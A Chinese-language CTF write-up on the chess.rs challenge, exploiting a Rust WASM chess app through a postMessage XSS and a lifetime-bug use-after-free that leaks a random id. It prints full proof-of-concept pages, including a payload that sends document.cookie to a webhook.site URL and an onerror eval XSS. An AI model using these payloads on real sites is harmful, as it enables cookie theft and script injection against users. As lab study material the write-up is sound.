---
tags:
  - Rust
  - XSS
  - UAF
---

# chess.rs

A Rust WASM XSS pwn challenge.

题目给了完整的 Cargo 工作区，Rust 对于 wasm 支持可以直接用 [wasm-pack](https://rustwasm.github.io/wasm-pack/installer/) 安装工具包。

`cargo build` 指定 target 为 wasm32-unknown-unknown 就行，或者直接使用工具包 `wasm-pack build`。

题目环境是一个用 rust http 服务 axum 起的一个 spa 路由。`index.html` 嵌入 iframe `engine.html`，然后用 `onMessage/postMessage` 两者交互，而 `engine.html` 则通过胶水函数与 wasm 模块交互。

```
index.html <-> engine.html <-> wasm module
```

```js
// index.html to engine.html
const engine = $("#engine")[0].contentWindow;
const send = (msg) => engine.postMessage({ ...msg, id }, location.origin);
window.onmessage = (e) => {
    ...
    send({ ... });
};
// engine.html to index.html
window.onmessage = (e) => {
    ...
    e.source.postMessage(chess.handle(JSON.stringify(e.data)), e.origin);
};

window.top.postMessage("ready", "*");
```

初始化的时候，`engine` 向 `index` 发送 ready 信号，然后其使用的窗口是 `window.top` 而不是 `window.parent`，前者会直接返回最顶层的窗口实例，因此可以构造自己的恶意页面嵌套题目的 `index.html`，此时 `engine` 与 `index` 之间的通信就变成了 `engine` 与恶意页面之间的通信。

## XSS

可以发现在 `error` 的时候会直接导致 html 渲染，是一个明显的 XSS 点。

```js
// game.js#L60
if (e.data.type === "error") {
    $("#error").html(e.data.data);
    send({ type: "get_state" });
}
```

直接发送 `postMessage` 便能造成 XSS。

```js
window.postMessage({type: "error", data: "<script>alert(1)</script>"})
```

## UAF

然而在题目环境中有一个 `id` 的限制，它会在每次页面加载时随机生成，并会对除了 `ready` 之外的所有消息进行 `id` 校验，如果不匹配则直接返回。

```js
const id = [...crypto.getRandomValues(new Uint8Array(16))].map(v => alphabet[v % alphabet.length]).join("");

if (e.data.id !== id) {
    return;
}
```

所以需要通过某种方法获取到 `id`。

这里利用到了 Rust 的一个 soundness hole，其由于生命周期标注问题从而导致了悬垂指针，让我们能够 uaf 从而在堆上泄露数据。

审计一下代码：

```rs
// game.rs
#[derive(Debug)]
pub struct Game<'a> {
    pub start_type: StartType,
    pub start: &'a str,
    pub moves: Vec<Move>,
}
fn validate_fen<'a, 'b>(fen: &'b str, default: &'a &'b str) -> (StartType, &'a str) {
    match fen.parse::<Fen>() {
        Ok(_) => (StartType::Fen, fen),
        Err(_) => (StartType::Fen, default),
    }
}
impl ChessGame for Game<'_> {
    fn start(init: &str) -> Self {
        let mut validator: fn(_, _) -> (StartType, &'static str) = validate_fen;
        if init.contains(';') {
            validator = validate_epd;
        }
        let data: (StartType, &str) = validator(init, &DEFAULT_FEN);
        Game {
            start_type: data.0,
            start: data.1,
            moves: Vec::new(),
        }
    }
}
```

wasm 中有个 `game` 结构体，查看其标注可以知道它与 `start` 字段的生命周期是绑定的；对于 `validate_fen` 来说有两个生命周期标注，而在 `Game::start` 调用的时候，重新声明了 `'a` 的生命周期为 `'static` 即全局生命周期，但是传入是 `init` 显然并不是全局生命周期，它会在 `handler::init` 调用结束后被 drop，因此造成了悬垂指针。

一个 demo:

```html
<!DOCTYPE html>
<html>
    <body>
        <iframe src="about:blank" name="alert(1)"></iframe>
        <script>
            const sleep = (ms) => new Promise(r => setTimeout(r, ms));
            
            const game = window.frames[0];
            game.location = "http://localhost:1337";
            
            window.onmessage = async (e) => {
                if (e.data === "ready") {
                    // 先构造一个 game
                    e.source.postMessage({ id: "SilentE", type: "init", data: "8/8/8/8/8/8/8/8 " }, "*");
                    await sleep(250);
                    // 调用题目的 game
                    game.postMessage("ready", "*");
                    await sleep(250);
                    // 触发 error 拿到泄露数据
                    e.source.postMessage({ id: "SilentE", type: "init" }, "*");
                    return;
                }
                
                
                if (e.data.type === "error") {
                    console.log(e.data.id + e.data.data);
                    return;
                }
            }
        </script>
    </body>
</html>
```

wasm 的内存是由 js 的 `ArrayBuffer` 管理，但其具体的分配还是由源语言来决定，对于 Rust 来说，`wasm-bindgen` 导出了 [`__wbindgen_malloc`](https://github.com/rustwasm/wasm-bindgen/blob/76e4cad8bb0dadc27b532bc051817ecf9bc3ac7a/src/lib.rs#L1561)，其内部实现是用的标准库中的 `alloc`。

> Why do these values work? I didn't want to trace heap allocations, so... ¯\(ツ)/¯

由于目前缺少对于 wasm 的直接调试，所以感觉只有 fuzz 比较有效，通过不断调试，能够拿到 id 的前 14 位:

```js
e.source.postMessage({ id: "A".repeat(16), type: "init" }, "*");
await sleep(100);
e.source.postMessage({ id: "SilentE", type: "init", data: "8/8/8/8/8/8/8/8 " }, "*");
await sleep(100);
game.postMessage("ready", "*");
await sleep(100);
e.source.postMessage({ id: "SilentE", type: "init"}, "*");
```

![202303151022496](https://cdn.silente.top/img/202303151022496.png)

后面两位试了几次没搞出来就摆了，不知道有没有其他更好的方法。

下面是一些其他构造：

??? note "官方"
    ```js
    e.source.postMessage({ id: "A".repeat(0), type: "init", data: "8/k7/8/8/8/8/K7/8 w - - 0 1" +" ".repeat(1) }, "*");
    await sleep(250);
    e.source.postMessage({ id: "B".repeat(13), type: "init", data: "8/k7/8/8/8/8/K7/8 w - - 0 1" +" ".repeat(34) }, "*");
    await sleep(250);
    window.frames[0].postMessage("ready", "*");
    await sleep(500);
    e.source.postMessage({ id: "B".repeat(13), type: "init" }, "*");
    return;
    ```

??? note "Rogue Waves"
    ```js
    async function main() {
        // Wait for the ready message to get sent to us from the engine
        let engine = await new Promise(res => { onmessage = (e) => res(e.source) })
        
        // Spam the engine with init requests from different clients
        // (each one uses a different id)
        for (let i = 0; i < lets.length; i++) {
            // Each of these inits will trigger the UAF because 
            // it has data field set to a valid chess string
            // (it won't use the default start string) 
            // To increase chances of success, we use a valid
            // chess string that is the same length as 
            // game.js's id.
            engine.postMessage({
                type: 'init', 
                data: '8/8/8/8/8/8/8/8 ', 
                id: lets[i],
            }, '*')

            await new Promise(res => setTimeout(res, 10))

            // These inits won't trigger the UAF because we are not sending an
            // init string, but it's part of the fuzzing routine that we found to work.
            // You know what they say, "garbage in, flag out."
            engine.postMessage({
                type: 'init', 
                id: lets[i].repeat(16)
            }, '*') 

            await new Promise(res => setTimeout(res, 10))
        }

        await new Promise(res => setTimeout(res, 10))

        // Send the ready message to game.js so that
        // it will send its own init message to engine,
        // allocating its id using the engine's allocator.
        game.contentWindow.postMessage('ready', '*')

        await new Promise(res => setTimeout(res, 100))

        // Now re-init all the clients that had the UAF
        // Hopefully one of them had their UAF
        // overwritten by game.js's id.
        for (let i = 0; i < lets.length; i++) {
            engine.postMessage({
                type: 'init',
                id: lets[i]
            }, '*')
        }
    }
    ```

## Cookie

> Then, with this leak, we can send an error message to the iframe at https://chessrs.mc.ax, and get JS execution on that page! Now there's only one problem left - SameSite. Since the flag is in the admin's cookie and is set with just document.cookie, it is SameSite Lax by default, which means that the cookie isn't in the iframe. I know that one team got really tripped up by this.

题目中 `puppeteer` 默认 cookie 策略是 `SameSite Lax`，即其 iframe 中不会存在 cookie，可以直接使用 `window.open('/')` 打开新的一个标签页从而得到 flag。

```js
<iframe src="about:blank" name="navigator.sendBeacon('https://webhook.site/xxx', window.open('/').document.cookie)"></iframe>
```

完整 poc

```html
<!DOCTYPE html>
<html>
    <body>
        <iframe src="about:blank" name="navigator.sendBeacon('https://webhook.site/8816666e-3cb1-4e6a-b58a-a5d2465b5a0d', window.open('/').document.cookie)"></iframe>
        <script>
            const sleep = (ms) => new Promise(r => setTimeout(r, ms));
            
            window.frames[0].location = "http://localhost:1337";
            
            window.onmessage = async (e) => {
                if (e.data === "ready") {
                    e.source.postMessage({ id: "A".repeat(0), type: "init", data: "8/k7/8/8/8/8/K7/8 w - - 0 1" + " ".repeat(1) }, "*");
                    await sleep(250);
                    e.source.postMessage({ id: "B".repeat(13), type: "init", data: "8/k7/8/8/8/8/K7/8 w - - 0 1" + " ".repeat(34) }, "*");
                    await sleep(250);
                    window.frames[0].postMessage("ready", "*");
                    await sleep(500);
                    e.source.postMessage({ id: "B".repeat(13), type: "init" }, "*");
                    await sleep(250);
                    return;
                }
                
                
                if (e.data.type === "error") {
                    console.log(e.data.id + e.data.data);
                    const leak = /"(.*?)"/.exec(e.data.data)[1].split(" ")[0].slice(0, 16);
                    console.log(leak);
                    window.frames[0].postMessage({
                        id: leak,
                        type: "error",
                        data: `<img src=x onerror=eval(window.name) />`
                    }, "*");
                    return;
                }
            }
        </script>
    </body>
</html>
```
